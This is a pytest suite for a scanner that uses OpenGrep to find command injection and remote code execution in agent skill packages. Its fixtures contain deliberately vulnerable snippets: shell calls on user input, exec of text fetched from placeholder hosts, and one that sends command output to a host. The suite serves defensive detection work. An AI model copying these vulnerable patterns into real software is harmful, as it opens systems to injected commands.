"""OpenGrep process-boundary tests."""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest
from ruamel.yaml import YAML

from skill_xray import opengrep_bridge
from skill_xray.ingest import build_package
from skill_xray.opengrep_bridge import (
    _RULES,
    SelectedCode,
    check,
    findings_from_report,
    select_executable_code,
)
from skill_xray.opengrep_runtime import OpenGrepRuntimeError, resolve_opengrep
from skill_xray.parse import parse_package


def _parsed(root):
    return parse_package(build_package(str(root)))


def _result(path="0000.py", line=3, vector="SXV-008"):
    return {
        "check_id": "skill-xray.python-local-command-injection",
        "path": path,
        "start": {"line": line, "col": 1, "offset": 10},
        "end": {"line": line, "col": 20, "offset": 29},
        "extra": {
            "message": "Untrusted local input reaches a Python command-execution sink.",
            "severity": "ERROR",
            "metadata": {
                "skill_xray_vector": vector,
                "skill_xray_rule": "opengrep-python-command-injection",
                "skill_xray_severity": "critical",
            },
            "fingerprint": "stable-id",
            "dataflow_trace": {"taint_source": ["source"]},
        },
    }


def _taint_result(line, vector, command, source_line=None):
    result = _result(line=line, vector=vector)
    result["extra"]["metavars"] = {"$COMMAND": {"abstract_content": command}}
    if source_line is not None:
        result["extra"]["dataflow_trace"] = {
            "taint_source": [
                "CliLoc",
                [{
                    "path": "0000.py",
                    "start": {"line": source_line, "col": 1},
                    "end": {"line": source_line, "col": 2},
                }, "source"],
            ],
        }
    return result


def _write_report(command, report):
    output = Path(command[command.index("--output") + 1])
    output.write_text(report, encoding="utf-8")


def test_selects_real_python_files(make_package):
    parsed = _parsed(make_package({"run.py": "import os\nos.system(input())\n"}))
    assert select_executable_code(parsed) == [
        SelectedCode("run.py", "import os\nos.system(input())\n", "file")
    ]


def test_selects_shell_only_when_requested(make_package):
    parsed = _parsed(make_package({"run.sh": "echo ok\n", "run.py": "print(1)\n"}))
    assert select_executable_code(parsed, languages=("shell",)) == [
        SelectedCode("run.sh", "echo ok\n", "file", ".sh")
    ]


def test_bash_engine_does_not_receive_other_shell_dialects(make_package):
    parsed = _parsed(make_package({
        "SKILL.md": (
            "```bash\necho bash\n```\n"
            "```fish\necho fish\n```\n"
            "```powershell\nWrite-Output pwsh\n```\n"
        ),
    }))
    selected = select_executable_code(parsed, languages=("shell",))
    assert len(selected) == 1 and "echo bash" in selected[0].text


def test_supported_shell_fences_share_one_line_mapped_target(make_package):
    parsed = _parsed(make_package({
        "SKILL.md": "```bash\necho bash\n```\n```sh\necho sh\n```\n",
    }))
    selected = select_executable_code(parsed, languages=("shell",))
    assert len(selected) == 1
    assert [line for line in selected[0].text.splitlines() if line] == [
        "echo bash", "echo sh",
    ]


def test_lifts_python_fences_independent_of_attacker_controlled_grants(make_package):
    allowed = make_package({
        "SKILL.md": (
            "---\nname: x\nallowed-tools: Bash\n---\n"
            "```python\nimport os\nos.system(input())\n```\n"
        ),
        "README.md": "```python\nexec(input())\n```\n",
    }, name="allowed")
    denied = make_package({
        "SKILL.md": (
            "---\nname: x\nallowed-tools: Read\n---\n"
            "```python\nexec(input())\n```\n"
        ),
    }, name="denied")

    selected = select_executable_code(_parsed(allowed))
    assert len(selected) == 1
    assert selected[0].rel == "SKILL.md" and selected[0].origin == "fence"
    assert selected[0].text.splitlines()[5] == "import os"
    selected = select_executable_code(_parsed(denied))
    assert len(selected) == 1 and "exec(input())" in selected[0].text


def test_nested_manifest_cannot_suppress_fence_analysis(make_package):
    root = make_package({
        "SKILL.md": "---\nname: root\nallowed-tools: Bash\n---\n",
        "nested/SKILL.md": "---\nname: child\nallowed-tools: Read\n---\n",
        "nested/task.md": "```python\nexec(input())\n```\n",
    })
    selected = select_executable_code(_parsed(root))
    assert len(selected) == 1 and "exec(input())" in selected[0].text


def test_report_maps_temporary_path_to_original_location():
    result = _result(line=3)
    result["check_id"] = "C.Users.local.rules.skill-xray.python-local-command-injection"
    result["extra"]["dataflow_trace"] = {
        "taint_source": [{"path": "C:\\Temp\\scan\\0000.py"}],
    }
    targets = {"0000.py": SelectedCode("SKILL.md", "\n\nexec(input())", "fence")}
    finding = findings_from_report({"results": [result], "errors": []}, targets)[0]
    assert (finding.vector, finding.rule, finding.path, finding.line) == (
        "SXV-008", "opengrep-python-command-injection", "SKILL.md", 3,
    )
    assert finding.evidence["origin"] == "fence"
    assert finding.evidence["fingerprint"] == "stable-id"
    assert finding.evidence["engine_rule"] == "skill-xray.python-local-command-injection"
    assert finding.evidence["dataflow_trace"]["taint_source"][0]["path"] == "SKILL.md"


def test_unmapped_rule_and_engine_error_are_visible():
    targets = {"0000.py": SelectedCode("run.py", "pass", "file")}
    report = {
        "results": [_result(vector="SXV-999")],
        "errors": [{"path": "0000.py", "message": "parse failed"}],
    }
    findings = findings_from_report(report, targets)
    assert {finding.rule for finding in findings} == {
        "opengrep-unmapped-rule", "opengrep-analysis-error",
    }
    assert all(finding.path == "run.py" for finding in findings)


def test_reject_only_postfilter_work_is_bounded_per_target(monkeypatch):
    calls = 0

    def validate(*_args, **_kwargs):
        nonlocal calls
        calls += 1
        return False

    monkeypatch.setattr(opengrep_bridge, "_python_definite_false_positive", validate)
    report = {"results": [_result(line=line) for line in range(1, 1001)], "errors": []}
    target = SelectedCode("run.py", "pass\n" * 1000, "file")

    findings = findings_from_report(report, {"0000.py": target})

    assert calls == opengrep_bridge._MAX_POSTFILTERS_PER_TARGET
    assert len(findings) == 1000
    assert any(
        finding.evidence.get("postfilter") == "retained-after-validation-budget"
        for finding in findings
    )


@pytest.mark.parametrize(("vector", "source"), [
    ("SXV-008", "os.getenv('CFG')"),
    ("SXV-018", "requests.get('https://example.invalid').text"),
])
def test_python_import_shadow_filters_known_opengrep_scope_overtaint(vector, source):
    result = _taint_result(5, vector, "cfg", source_line=2)
    target = SelectedCode(
        "run.py",
        ("import os, subprocess, requests\ncfg = %s\ndef run():\n"
         "    from mypkg import safe_cfg as cfg\n"
         "    subprocess.call(cfg, shell=True)\n") % source,
        "file",
    )
    assert findings_from_report({"results": [result], "errors": []}, {"0000.py": target}) == []


def test_python_import_in_other_scope_does_not_hide_finding():
    result = _taint_result(7, "SXV-008", "cfg", source_line=2)
    target = SelectedCode(
        "run.py",
        "import os, subprocess\ncfg = os.getenv('CFG')\ndef unrelated():\n"
        "    from mypkg import safe_cfg as cfg\ndef run():\n    pass\n"
        "subprocess.call(cfg, shell=True)\n",
        "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("vector", "source"), [
    ("SXV-008", "os.getenv('CFG')"),
    ("SXV-018", "requests.get('https://example.invalid').text"),
])
def test_python_local_taint_after_import_is_not_hidden(vector, source):
    result = _taint_result(5, vector, "cfg", source_line=4)
    target = SelectedCode(
        "run.py",
        "import os, subprocess, requests\ndef run():\n"
        "    from mypkg import safe_cfg as cfg\n"
        "    cfg = %s\n    subprocess.call(cfg, shell=True)\n" % source,
        "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == [vector]


@pytest.mark.parametrize(("vector", "source"), [
    ("SXV-008", "sys.argv[1]"),
    ("SXV-018", "requests.get('https://example.invalid').text"),
])
@pytest.mark.parametrize("shadow", ["function", "object"])
def test_python_rebound_sink_is_filtered(vector, source, shadow):
    if shadow == "function":
        text = (
            "import sys, requests\nfrom os import system\n"
            "def system(command):\n    pass\n"
            "system(%s)\n" % source
        )
        line = 5
    else:
        text = (
            "import os, sys, requests\nclass Safe:\n"
            "    def system(self, command):\n        pass\n"
            "os = Safe()\nos.system(%s)\n" % source
        )
        line = 6
    result = _taint_result(line, vector, source)
    target = SelectedCode("run.py", text, "file")
    assert findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    }) == []


def test_python_bare_annotation_does_not_shadow_imported_sink():
    result = _taint_result(3, "SXV-008", "sys.argv[1]")
    target = SelectedCode(
        "run.py", "import os, sys\nos: object\nos.system(sys.argv[1])\n", "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize("text", [
    "exec = print\nexec(input())\n",
    "def eval(value):\n    print(value)\neval(input())\n",
])
def test_python_rebound_builtin_sink_is_filtered(text):
    line = text.count("\n")
    result = _taint_result(line, "SXV-008", "input()")
    target = SelectedCode("run.py", text, "file")
    assert findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    }) == []


def test_python_deleted_or_bare_annotated_builtin_sink_is_not_filtered():
    for text in (
        "exec = print\ndel exec\nexec(input())\n",
        "exec: object\nexec(input())\n",
    ):
        result = _taint_result(3 if "del" in text else 2, "SXV-008", "input()")
        target = SelectedCode("run.py", text, "file")
        findings = findings_from_report({"results": [result], "errors": []}, {
            "0000.py": target,
        })
        assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("vector", "source"), [
    ("SXV-008", "os.getenv('CFG')"),
    ("SXV-018", "requests.get('https://example.invalid').text"),
])
def test_python_explicit_global_command_is_not_filtered(vector, source):
    result = _taint_result(6, vector, "cfg", source_line=2)
    target = SelectedCode(
        "run.py",
        ("import os, subprocess, requests\ncfg = %s\ndef run():\n"
         "    global cfg\n    from safe import cfg\n"
         "    subprocess.call(cfg, shell=True)\n") % source,
        "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == [vector]


@pytest.mark.parametrize(("vector", "source"), [
    ("SXV-008", "sys.argv[1]"),
    ("SXV-018", "requests.get('https://example.invalid').text"),
])
def test_python_future_sink_rebinding_does_not_hide_finding(vector, source):
    result = _taint_result(2, vector, source)
    target = SelectedCode(
        "run.py",
        "import os, sys, requests\nos.system(%s)\nos = object()\n" % source,
        "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == [vector]


def test_python_future_command_import_does_not_hide_finding():
    result = _taint_result(4, "SXV-008", "cfg", source_line=2)
    target = SelectedCode(
        "run.py",
        "import os, subprocess\ncfg = os.getenv('CFG')\ndef run():\n"
        "    subprocess.call(cfg, shell=True)\n    from safe import cfg\n",
        "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("prefix", "call"), [
    ("import os as operating_system", "operating_system.system"),
    ("from os import system as launch", "launch"),
])
def test_python_real_sink_alias_is_not_filtered(prefix, call):
    result = _taint_result(3, "SXV-008", "sys.argv[1]")
    target = SelectedCode(
        "run.py", "%s\nimport sys\n%s(sys.argv[1])\n" % (prefix, call), "file",
    )
    findings = findings_from_report({"results": [result], "errors": []}, {"0000.py": target})
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("text", "sink_line", "retained"), [
    (
        "import os\ndef identity(value):\n    try:\n        return value\n"
        "    finally:\n        return 'safe'\nos.system(identity(input()))\n",
        7, False,
    ),
    (
        "import os\ndef identity(value):\n    try:\n        return value\n"
        "    finally:\n        return 'safe'\ndef outer():\n"
        "    def identity(value):\n        return value\n"
        "    os.system(identity(input()))\nouter()\n",
        10, True,
    ),
])
def test_finally_return_only_suppresses_the_called_definition(text, sink_line, retained):
    result = _taint_result(sink_line, "SXV-008", "identity(input())", sink_line)
    findings = findings_from_report(
        {"results": [result], "errors": []},
        {"0000.py": SelectedCode("run.py", text, "file")},
    )
    assert bool(findings) is retained


@pytest.mark.parametrize(("local", "source_line", "retained"), [
    (False, 5, True),
    (True, 6, False),
])
def test_self_assignment_respects_python_lexical_scope(local, source_line, retained):
    nested = "def outer():\n    run = run\n    run(input())\nouter()\n" if local else (
        "run = run\nrun(input())\n"
    )
    target = SelectedCode(
        "run.py", "import os\ndef run(value):\n    os.system(value)\n" + nested, "file",
    )
    result = _taint_result(3, "SXV-008", "value", source_line)
    if local:
        result["extra"]["dataflow_trace"]["taint_source"][1][0]["start"]["col"] = 9
    findings = findings_from_report(
        {"results": [result], "errors": []}, {"0000.py": target},
    )
    assert bool(findings) is retained


@pytest.mark.parametrize(("shell", "retained"), [
    ("False or True", True),
    ("True and True", True),
    ("True and False", False),
    ("False", False),
])
def test_subprocess_shell_boolean_expression(shell, retained):
    target = SelectedCode(
        "run.py", f"import subprocess\nsubprocess.run(input(), shell={shell})\n", "file",
    )
    result = _taint_result(2, "SXV-008", "input()", 2)
    findings = findings_from_report(
        {"results": [result], "errors": []}, {"0000.py": target},
    )
    assert bool(findings) is retained


@pytest.mark.parametrize(("text", "source_line", "sink_line"), [
    (
        "import os, sys\ncmd = 'safe'\nif mode:\n    cmd = sys.argv[1]\n"
        "else:\n    os.system(cmd)\n",
        4, 6,
    ),
    (
        "import os, sys\ncmd = 'safe'\nmatch mode:\n    case 1:\n"
        "        cmd = sys.argv[1]\n    case 2:\n        os.system(cmd)\n",
        5, 7,
    ),
])
def test_python_mutually_exclusive_branch_flow_is_filtered(text, source_line, sink_line):
    result = _taint_result(sink_line, "SXV-008", "cmd", source_line)
    target = SelectedCode("run.py", text, "file")
    assert findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    }) == []


@pytest.mark.parametrize(("text", "source_line", "sink_line"), [
    (
        "import os, sys\nif mode:\n    cmd = sys.argv[1]\n    os.system(cmd)\n",
        3, 4,
    ),
    (
        "import os, sys\nmatch mode:\n    case 1:\n        cmd = sys.argv[1]\n"
        "        os.system(cmd)\n",
        4, 5,
    ),
])
def test_python_same_branch_flow_is_retained(text, source_line, sink_line):
    result = _taint_result(sink_line, "SXV-008", "cmd", source_line)
    target = SelectedCode("run.py", text, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("text", "source_line", "sink_line"), [
    (
        "import os, sys\nif mode:\n    cmd = sys.argv[1]\nos.system(cmd)\n",
        3, 4,
    ),
    (
        "import os, sys\nmatch mode:\n    case 1:\n        cmd = sys.argv[1]\n"
        "os.system(cmd)\n",
        4, 5,
    ),
])
def test_python_branch_to_post_join_flow_is_retained(text, source_line, sink_line):
    result = _taint_result(sink_line, "SXV-008", "cmd", source_line)
    target = SelectedCode("run.py", text, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize(("text", "source_line", "sink_line"), [
    (
        "import os, sys\ncmd = 'safe'\nfor mode in modes:\n    if mode:\n"
        "        cmd = sys.argv[1]\n    else:\n        os.system(cmd)\n",
        5, 7,
    ),
    (
        "import os, sys\ncmd = 'safe'\nwhile ready():\n    match mode:\n"
        "        case 1:\n            cmd = sys.argv[1]\n"
        "        case 2:\n            os.system(cmd)\n",
        5, 7,
    ),
])
def test_python_different_loop_iterations_are_not_filtered(text, source_line, sink_line):
    result = _taint_result(sink_line, "SXV-008", "cmd", source_line)
    target = SelectedCode("run.py", text, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


def test_python_target_is_parsed_once_per_report(monkeypatch):
    parsed = 0
    original = opengrep_bridge.ast.parse

    def count_parse(source):
        nonlocal parsed
        parsed += 1
        return original(source)

    monkeypatch.setattr(opengrep_bridge.ast, "parse", count_parse)
    target = SelectedCode(
        "run.py", "import os\nos.system(input())\nos.system(input())\n", "file",
    )
    report = {"results": [_result(line=2), _result(line=3)], "errors": []}
    findings_from_report(report, {"0000.py": target})
    assert parsed == 1


def test_malformed_extra_is_not_a_bridge_crash():
    result = _result()
    result["extra"] = "invalid"
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": SelectedCode("run.py", "pass\n", "file"),
    })
    assert [finding.rule for finding in findings] == ["opengrep-unmapped-rule"]


def test_malformed_report_shape_is_not_clean():
    findings = findings_from_report({"results": None, "errors": []}, {})
    assert len(findings) == 1 and findings[0].rule == "opengrep-invalid-output"


def test_malformed_errors_shape_does_not_discard_valid_result():
    findings = findings_from_report(
        {"results": [_result()], "errors": None},
        {"0000.py": SelectedCode("run.py", "\n\npass\n", "file")},
    )
    assert {finding.rule for finding in findings} == {
        "opengrep-invalid-output", "opengrep-python-command-injection",
    }


@pytest.mark.parametrize("field", ["results", "errors"])
def test_malformed_report_entry_is_not_clean(field):
    report = {"results": [], "errors": []}
    report[field] = [1]
    findings = findings_from_report(report, {})
    assert [finding.rule for finding in findings] == ["opengrep-invalid-output"]


@pytest.mark.parametrize(
    "metavars",
    ["invalid", {"$PATH": []}, {"$PATH": {"abstract_content": []}}],
)
def test_malformed_metavars_are_reported_and_not_retained(metavars):
    result = _result()
    result["extra"]["metavars"] = metavars
    findings = findings_from_report(
        {"results": [result], "errors": []},
        {"0000.py": SelectedCode("run.py", "\n\npass\n", "file")},
    )
    assert {finding.rule for finding in findings} == {
        "opengrep-invalid-output", "opengrep-python-command-injection",
    }
    mapped = next(finding for finding in findings if finding.vector)
    assert "metavars" not in mapped.evidence


@pytest.mark.parametrize(("body", "command", "source_line", "sink_line"), [
    # control: the parameter reaches the sink unchanged (retained before and after).
    (
        "import os, sys\ndef run_it(user_input):\n    os.system(user_input)\n"
        "run_it(sys.argv[1])\n",
        "user_input", 4, 3,
    ),
    # regression: the parameter is laundered through a local before the sink. The
    # interprocedural filter must trace command -> user_input and keep the finding.
    (
        "import os, sys\ndef run_it(user_input):\n    command = user_input\n"
        "    os.system(command)\nrun_it(sys.argv[1])\n",
        "command", 5, 4,
    ),
])
def test_python_parameter_laundered_through_local_is_retained(
    body, command, source_line, sink_line,
):
    result = _taint_result(sink_line, "SXV-008", command, source_line)
    target = SelectedCode("run.py", body, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


@pytest.mark.parametrize("driver", [
    "asyncio.run(main())",
    "asyncio.create_task(main())",
    "asyncio.ensure_future(main())",
])
def test_python_async_entrypoint_driver_is_retained(driver):
    body = (
        "import asyncio, os\nasync def main():\n    os.system(input())\n" + driver + "\n"
    )
    result = _taint_result(3, "SXV-008", "input()", 3)
    target = SelectedCode("run.py", body, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert [finding.vector for finding in findings] == ["SXV-008"]


def test_python_truly_unawaited_async_call_is_still_filtered():
    body = "import asyncio, os\nasync def main():\n    os.system(input())\nmain()\n"
    result = _taint_result(3, "SXV-008", "input()", 3)
    target = SelectedCode("run.py", body, "file")
    findings = findings_from_report({"results": [result], "errors": []}, {
        "0000.py": target,
    })
    assert findings == []


def test_malformed_metadata_does_not_discard_valid_sibling_result():
    valid = _result(path="0000.py")
    malformed = _result(path="0001.py")
    malformed["extra"]["metadata"]["skill_xray_vector"] = {}
    source = "\n\npass\n"
    findings = findings_from_report(
        {"results": [valid, malformed], "errors": []},
        {
            "0000.py": SelectedCode("valid.py", source, "file"),
            "0001.py": SelectedCode("invalid.py", source, "file"),
        },
    )
    assert {(finding.vector, finding.rule) for finding in findings} == {
        ("SXV-008", "opengrep-python-command-injection"),
        ("", "opengrep-unmapped-rule"),
    }


@pytest.mark.parametrize(
    "start",
    [
        {},
        {"line": None},
        {"line": "3"},
        {"line": 0},
        {"line": -1},
        {"line": True},
        {"line": 999},
    ],
)
def test_invalid_result_location_is_fail_visible(start):
    result = _result()
    result["start"] = start
    findings = findings_from_report(
        {"results": [result], "errors": []},
        {"0000.py": SelectedCode("run.py", "\n\npass\n", "file")},
    )
    assert [(finding.vector, finding.rule, finding.severity) for finding in findings] == [
        ("", "opengrep-invalid-output", "high")
    ]


def test_check_invokes_argument_list_and_converts_json(make_package):
    parsed = _parsed(make_package({"run.py": "import os\nos.system(input())\n"}))
    called = {}

    def runner(command, **kwargs):
        called["command"] = command
        called["kwargs"] = kwargs
        _write_report(command, json.dumps({
            "results": [_result(path="0000.py", line=2)],
            "errors": [],
            "paths": {"scanned": ["0000.py"]},
        }))
        return subprocess.CompletedProcess(command, 0, None, "")

    findings = check(parsed, executable="opengrep", runner=runner)
    assert findings[0].vector == "SXV-008" and findings[0].path == "run.py"
    assert called["command"][:2] == ["opengrep", "scan"]
    assert "--disable-nosem" in called["command"]
    assert "--disable-version-check" in called["command"]
    assert "--jobs=1" in called["command"]
    assert "--max-memory=512" in called["command"]
    assert called["kwargs"]["check"] is False
    assert "shell" not in called["kwargs"]
    assert called["kwargs"]["stdout"] == subprocess.DEVNULL
    assert called["kwargs"]["stderr"] != subprocess.PIPE
    assert "AWS_SECRET_ACCESS_KEY" not in called["kwargs"]["env"]
    if os.name == "nt":
        env = called["kwargs"]["env"]
        profile = Path(env["HOME"])
        assert env["USERPROFILE"] == os.environ["USERPROFILE"]
        assert Path(env["APPDATA"]).is_relative_to(profile)
        assert Path(env["LOCALAPPDATA"]).is_relative_to(profile)
        assert Path(env["XDG_CONFIG_HOME"]).is_relative_to(profile)
        assert Path(env["SEMGREP_SETTINGS_FILE"]).is_relative_to(profile)
        assert env["SEMGREP_LOG_FILE"].endswith("engine.log")


def test_relative_rule_path_is_resolved_before_temporary_cwd(make_package, tmp_path, monkeypatch):
    parsed = _parsed(make_package({"run.py": "pass\n"}))
    rules = tmp_path / "rules.yml"
    rules.write_text("rules: []\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    seen = {}

    def runner(command, **_kwargs):
        seen["config"] = command[command.index("--config") + 1]
        _write_report(command, json.dumps({
            "results": [], "errors": [], "paths": {"scanned": ["0000.py"]},
        }))
        return subprocess.CompletedProcess(command, 0, None, "")

    assert check(
        parsed, executable="opengrep", rules="rules.yml", runner=runner
    ) == []
    assert Path(seen["config"]).is_absolute()


def test_skipped_selected_target_is_not_clean(make_package):
    parsed = _parsed(make_package({"run.py": "exec(input())\n"}))

    def runner(command, **_kwargs):
        _write_report(command, json.dumps({
            "results": [], "errors": [], "paths": {"scanned": []},
        }))
        return subprocess.CompletedProcess(command, 0, None, "")

    findings = check(parsed, executable="opengrep", runner=runner)
    assert [finding.rule for finding in findings] == ["opengrep-analysis-incomplete"]


def test_engine_error_redacts_local_paths():
    targets = {"0000.py": SelectedCode("run.py", "pass", "file")}
    report = {
        "results": [],
        "errors": [{"path": "0000.py", "message": "/tmp/private/0000.py failed"}],
    }
    finding = findings_from_report(report, targets, redactions=("/tmp/private",))[0]
    assert "/tmp/private" not in finding.message


def test_all_bounded_engine_errors_remain_visible():
    targets = {
        "%04d.py" % index: SelectedCode("run-%d.py" % index, "pass", "file")
        for index in range(25)
    }
    report = {
        "results": [],
        "errors": [
            {"path": name, "message": "parse failed"} for name in targets
        ],
    }
    findings = findings_from_report(report, targets)
    assert len(findings) == 25


def test_missing_engine_timeout_and_invalid_json_are_not_clean(make_package, monkeypatch):
    parsed = _parsed(make_package({"run.py": "exec(input())\n"}))
    monkeypatch.setattr("skill_xray.opengrep_bridge.resolve_opengrep", lambda _path: None)
    assert check(parsed, executable=None, runner=None)[0].rule == "opengrep-unavailable"

    def timeout_runner(command, **kwargs):
        raise subprocess.TimeoutExpired(command, kwargs["timeout"])

    assert check(parsed, executable="opengrep", runner=timeout_runner)[0].rule == (
        "opengrep-timeout"
    )

    def invalid_runner(command, **kwargs):
        _write_report(command, "not-json")
        return subprocess.CompletedProcess(command, 0, None, "")

    assert check(parsed, executable="opengrep", runner=invalid_runner)[0].rule == (
        "opengrep-invalid-output"
    )


def test_missing_and_oversized_reports_are_not_clean(make_package, monkeypatch):
    parsed = _parsed(make_package({"run.py": "exec(input())\n"}))

    def no_report(command, **kwargs):
        return subprocess.CompletedProcess(command, 0, None, "")

    assert check(parsed, executable="opengrep", runner=no_report)[0].rule == (
        "opengrep-invalid-output"
    )

    monkeypatch.setattr("skill_xray.opengrep_bridge._MAX_REPORT_BYTES", 3)

    def oversized(command, **kwargs):
        _write_report(command, "1234")
        return subprocess.CompletedProcess(command, 0, None, "")

    assert check(parsed, executable="opengrep", runner=oversized)[0].rule == (
        "opengrep-output-limit"
    )


def test_bundled_rules_are_valid_yaml_and_mapped():
    document = YAML(typ="safe").load(_RULES.read_text(encoding="utf-8"))
    rules = document["rules"]
    assert len(rules) == len({rule["id"] for rule in rules}) == 13
    assert sum(rule["languages"] == ["python"] for rule in rules) == 13
    assert {rule["metadata"]["skill_xray_vector"] for rule in rules} == {
        "SXV-008", "SXV-018", "SXV-019", "SXV-020", "SXV-021", "SXV-023",
        "SXV-024", "SXV-025", "SXV-026", "SXV-032", "SXV-040",
    }
    assert all("poc" not in rule["id"] for rule in rules)


def test_real_opengrep_detects_direct_flow_when_available(make_package):
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if not executable:
        pytest.skip("OpenGrep is not installed")
    parsed = _parsed(make_package({"run.py": "import os\nvalue = input()\nos.system(value)\n"}))
    findings = check(parsed, executable=executable)
    assert any(finding.vector == "SXV-008" and finding.line == 3 for finding in findings)


def test_real_opengrep_disables_attacker_suppressions_when_available(make_package):
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if not executable:
        pytest.skip("OpenGrep is not installed")
    code = "import os\nos.system(input())  # nosemgrep\n"
    findings = check(_parsed(make_package({"run.py": code})), executable=executable)
    assert any(finding.vector == "SXV-008" for finding in findings)


def test_real_opengrep_scans_utf8_expansion_when_available(make_package):
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if not executable:
        pytest.skip("OpenGrep is not installed")
    code = b"#" + (b"\x80" * 400_000) + b"\nimport os\nos.system(input())\n"
    findings = check(_parsed(make_package({"run.py": code})), executable=executable)
    assert any(finding.vector == "SXV-008" for finding in findings)


def test_real_opengrep_phase1_matrix_when_available(make_package):
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if not executable:
        pytest.skip("OpenGrep is not installed")
    files = {
        "input_system.py": "import os\nvalue = input()\nos.system(value)\n",
        "helper.py": (
            "import os\ndef launch(value):\n    os.system(value)\nlaunch(input())\n"
        ),
        "method_assigned.py": (
            "import os\nclass Runner:\n    def launch(self, value):\n"
            "        os.system(value)\nrunner = Runner()\nrunner.launch(input())\n"
        ),
        "method_inline.py": (
            "import os\nclass Runner:\n    def launch(self, value):\n"
            "        os.system(value)\nRunner().launch(input())\n"
        ),
        "method_internal.py": (
            "import os\nclass Runner:\n    def source(self):\n        return input()\n"
            "    def launch(self):\n        os.system(self.source())\n"
            "runner = Runner()\nrunner.launch()\n"
        ),
        "subprocess_alias.py": (
            "import subprocess as sp\nimport sys\nsp.run(sys.argv[1], shell=True)\n"
        ),
        "argparse_source.py": (
            "import argparse, os\nparser = argparse.ArgumentParser()\n"
            "args = parser.parse_args()\nos.system(args.command)\n"
        ),
        "environment.py": "import os\nos.system(os.getenv('COMMAND'))\n",
        "dict_bad.py": (
            "import os\ncommands = {'bad': input(), 'good': 'echo ok'}\n"
            "os.system(commands['bad'])\n"
        ),
        "eval_input.py": "value = input()\neval(value)\n",
        "remote_requests.py": (
            "import requests\npayload = requests.get('https://example.test').text\n"
            "exec(payload)\n"
        ),
        "remote_alias.py": (
            "import requests as rq\npayload = rq.get('https://example.test').text\n"
            "exec(payload)\n"
        ),
        "remote_urlopen.py": (
            "from urllib.request import urlopen\npayload = urlopen('https://example.test').read()\n"
            "exec(payload)\n"
        ),
        "nested_remote_literal.py": (
            "import os, requests\nrequests.post('https://example.test', "
            "json={'stamp': os.popen('date').read()})\n"
        ),
        "literal.py": "import os\nos.system('echo safe')\n",
        "shell_false.py": "import subprocess\nsubprocess.run(input(), shell=False)\n",
        "quoted.py": "import os, shlex\nos.system(shlex.quote(input()))\n",
        "overwrite.py": "import os\nvalue = input()\nvalue = 'echo safe'\nos.system(value)\n",
        "dict_safe.py": (
            "import os\ncommands = {'bad': input(), 'good': 'echo ok'}\n"
            "os.system(commands['good'])\n"
        ),
        "shadowed_exec.py": "exec = print\nexec(input())\n",
        "shadowed_eval.py": "def eval(value):\n    print(value)\neval(input())\n",
        "shadowed_input.py": "import os\ndef input(): return 'safe'\nos.system(input())\n",
        "shadowed_sys.py": (
            "import os\nclass Fake: argv = ['safe']\nsys = Fake()\n"
            "os.system(sys.argv[0])\n"
        ),
        "shadowed_requests.py": (
            "class Response: text = 'safe'\nclass Client:\n"
            "    def get(self, *_args): return Response()\n"
            "requests = Client()\nexec(requests.get('x').text)\n"
        ),
    }
    expected = {
        "input_system.py": {"SXV-008"},
        "subprocess_alias.py": {"SXV-008"},
        "argparse_source.py": {"SXV-008"},
        "environment.py": {"SXV-008"},
        "dict_bad.py": {"SXV-008"},
        "eval_input.py": {"SXV-008"},
        "quoted.py": {"SXV-008"},
        "remote_requests.py": {"SXV-018"},
        "remote_alias.py": {"SXV-018"},
        "remote_urlopen.py": {"SXV-018"},
        "helper.py": {"SXV-008"},
        "method_inline.py": {"SXV-008"},
        "method_internal.py": {"SXV-008"},
    }
    parsed = _parsed(make_package(files))
    actual = {}
    for finding in check(parsed, executable=executable):
        if finding.vector:
            actual.setdefault(finding.path, set()).add(finding.vector)
    assert actual == expected
